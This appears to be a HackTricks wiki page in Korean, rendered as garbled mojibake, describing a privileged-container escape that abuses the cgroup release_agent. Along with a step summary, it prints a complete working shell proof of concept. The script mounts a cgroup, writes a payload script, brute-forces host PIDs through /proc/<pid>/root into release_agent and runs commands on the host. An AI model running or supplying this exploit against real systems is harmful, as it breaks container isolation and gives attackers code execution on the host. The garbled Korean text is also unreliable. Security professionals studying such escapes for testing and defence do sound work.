{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

ìì„¸í•œ ë‚´ìš©ì€ **[https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**ì˜ ë¸”ë¡œê·¸ í¬ìŠ¤íŠ¸ë¥¼ í™•ì¸í•˜ì„¸ìš”. ì´ê²ƒì€ ìš”ì•½ì…ë‹ˆë‹¤:

ì´ ê¸°ìˆ ì€ **ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ í˜¸ìŠ¤íŠ¸ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•**ì„ ì„¤ëª…í•˜ë©°, Kata Containers ë˜ëŠ” íŠ¹ì • `devicemapper` ì„¤ì •ê³¼ ê°™ì´ í˜¸ìŠ¤íŠ¸ì˜ íŒŒì¼ ì‹œìŠ¤í…œ ê²½ë¡œë¥¼ ìˆ¨ê¸°ëŠ” ìŠ¤í† ë¦¬ì§€ ë“œë¼ì´ë²„ êµ¬ì„±ìœ¼ë¡œ ì¸í•œ ë¬¸ì œë¥¼ ê·¹ë³µí•©ë‹ˆë‹¤.

ì£¼ìš” ë‹¨ê³„:

1. **í”„ë¡œì„¸ìŠ¤ ID(PID) ì°¾ê¸°:** Linux ê°€ìƒ íŒŒì¼ ì‹œìŠ¤í…œì˜ `/proc/<pid>/root` ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì‚¬ìš©í•˜ì—¬, ì»¨í…Œì´ë„ˆ ë‚´ì˜ ëª¨ë“  íŒŒì¼ì— í˜¸ìŠ¤íŠ¸ì˜ íŒŒì¼ ì‹œìŠ¤í…œì— ìƒëŒ€ì ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í˜¸ìŠ¤íŠ¸ì—ì„œ ì»¨í…Œì´ë„ˆì˜ íŒŒì¼ ì‹œìŠ¤í…œ ê²½ë¡œë¥¼ ì•Œ í•„ìš”ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤.
2. **PID ë¸Œë£¨íŠ¸ í¬ìŠ¤:** í˜¸ìŠ¤íŠ¸ì˜ PIDë¥¼ ê²€ìƒ‰í•˜ê¸° ìœ„í•´ ë¸Œë£¨íŠ¸ í¬ìŠ¤ ì ‘ê·¼ ë°©ì‹ì´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ëŠ” `/proc/<pid>/root/<file>`ì—ì„œ íŠ¹ì • íŒŒì¼ì˜ ì¡´ì¬ë¥¼ ìˆœì°¨ì ìœ¼ë¡œ í™•ì¸í•¨ìœ¼ë¡œì¨ ìˆ˜í–‰ë©ë‹ˆë‹¤. íŒŒì¼ì´ ë°œê²¬ë˜ë©´, í•´ë‹¹ PIDê°€ ëŒ€ìƒ ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ì— ì†í•¨ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
3. **ì‹¤í–‰ íŠ¸ë¦¬ê±°:** ì¶”ì¸¡í•œ PID ê²½ë¡œê°€ `cgroups release_agent` íŒŒì¼ì— ê¸°ë¡ë©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ `release_agent`ì˜ ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ì˜ ì„±ê³µì€ ì¶œë ¥ íŒŒì¼ì˜ ìƒì„± ì—¬ë¶€ë¥¼ í™•ì¸í•˜ì—¬ í™•ì¸ë©ë‹ˆë‹¤.

### ìµìŠ¤í”Œë¡œì‡ ê³¼ì •

ìµìŠ¤í”Œë¡œì‡ ê³¼ì •ì€ ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ì˜ ì˜¬ë°”ë¥¸ PIDë¥¼ ì¶”ì¸¡í•˜ì—¬ í˜¸ìŠ¤íŠ¸ì—ì„œ í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•˜ëŠ” ë³´ë‹¤ ìì„¸í•œ ì¼ë ¨ì˜ ì‘ì—…ì„ í¬í•¨í•©ë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ ì§„í–‰ë©ë‹ˆë‹¤:

1. **í™˜ê²½ ì´ˆê¸°í™”:** í˜¸ìŠ¤íŠ¸ì—ì„œ í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸(`payload.sh`)ê°€ ì¤€ë¹„ë˜ê³ , cgroup ì¡°ì‘ì„ ìœ„í•œ ê³ ìœ í•œ ë””ë ‰í† ë¦¬ê°€ ìƒì„±ë©ë‹ˆë‹¤.
2. **í˜ì´ë¡œë“œ ì¤€ë¹„:** í˜¸ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰ë  ëª…ë ¹ì„ í¬í•¨í•˜ëŠ” í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‘ì„±ë˜ê³  ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ì„¤ì •ë©ë‹ˆë‹¤.
3. **Cgroup ì„¤ì •:** cgroupì´ ë§ˆìš´íŠ¸ë˜ê³  êµ¬ì„±ë©ë‹ˆë‹¤. `notify_on_release` í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ cgroupì´ í•´ì œë  ë•Œ í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ë„ë¡ í•©ë‹ˆë‹¤.
4. **PID ë¸Œë£¨íŠ¸ í¬ìŠ¤:** ì ì¬ì ì¸ PIDë¥¼ ë°˜ë³µí•˜ì—¬ ê° ì¶”ì¸¡ëœ PIDë¥¼ `release_agent` íŒŒì¼ì— ê¸°ë¡í•©ë‹ˆë‹¤. ì´ëŠ” í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ `release_agent`ë¡œ ì„¤ì •í•˜ëŠ” íš¨ê³¼ë¥¼ ëƒ…ë‹ˆë‹¤.
5. **ì‹¤í–‰ íŠ¸ë¦¬ê±° ë° í™•ì¸:** ê° PIDì— ëŒ€í•´ cgroupì˜ `cgroup.procs`ì— ê¸°ë¡í•˜ì—¬ PIDê°€ ì˜¬ë°”ë¥¸ ê²½ìš° `release_agent`ì˜ ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ì˜ ì¶œë ¥ì´ ë°œê²¬ë  ë•Œê¹Œì§€ ë£¨í”„ê°€ ê³„ì†ë©ë‹ˆë‹¤, ì´ëŠ” ì„±ê³µì ì¸ ì‹¤í–‰ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

ë¸”ë¡œê·¸ í¬ìŠ¤íŠ¸ì˜ PoC:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
</details>
{% endhint %}
